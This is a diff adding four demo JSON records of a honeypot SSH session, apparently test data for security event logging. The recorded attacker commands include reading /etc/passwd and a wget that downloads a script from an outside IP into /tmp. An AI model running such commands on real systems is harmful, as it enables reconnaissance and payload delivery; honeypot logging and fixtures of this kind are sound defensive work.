@@ -1,0 +1,4 @@
+{"schema":"honeypot_event.v1","source":"beelzebub","event":"login","session_id":"bz-ssh-001","user":"root","src_ip":"198.51.100.44","protocol":"ssh","ts":"2026-09-08T03:12:00Z","stage":null,"instance":"beelzebub-ssh","demo":true}
+{"schema":"honeypot_event.v1","source":"beelzebub","event":"cmd","session_id":"bz-ssh-001","cmd":"uname -a","src_ip":"198.51.100.44","protocol":"ssh","ts":"2026-09-08T03:12:04Z","stage":null,"instance":"beelzebub-ssh","demo":true}
+{"schema":"honeypot_event.v1","source":"beelzebub","event":"cmd","session_id":"bz-ssh-001","cmd":"cat /etc/passwd","src_ip":"198.51.100.44","protocol":"ssh","ts":"2026-09-08T03:12:08Z","stage":null,"instance":"beelzebub-ssh","demo":true}
+{"schema":"honeypot_event.v1","source":"beelzebub","event":"cmd","session_id":"bz-ssh-001","cmd":"wget http://203.0.113.80/x.sh -O /tmp/x.sh","src_ip":"198.51.100.44","protocol":"ssh","ts":"2026-09-08T03:12:12Z","stage":null,"instance":"beelzebub-ssh","demo":true}
